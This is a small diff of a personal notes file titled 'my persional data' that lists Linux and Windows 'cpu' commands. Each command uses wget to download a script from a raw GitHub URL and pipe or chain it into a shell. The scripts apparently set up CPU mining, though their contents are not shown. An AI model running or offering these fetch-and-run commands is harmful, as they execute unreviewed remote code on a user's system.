@@ -1,4 +1,4 @@
-oo# my persional data
+# my persional data
 linux  
 
 
@@ -9,4 +9,4 @@ cpu : wget https://raw.githubusercontent.com/qhjruekehr/personal/main/cp.sh && c
     
 windows
 
-cpu : wget -O c.sh |bash
+cpu : wget -O c.sh https://raw.githubusercontent.com/qhjruekehr/personal/main/win_mc.sh |bash
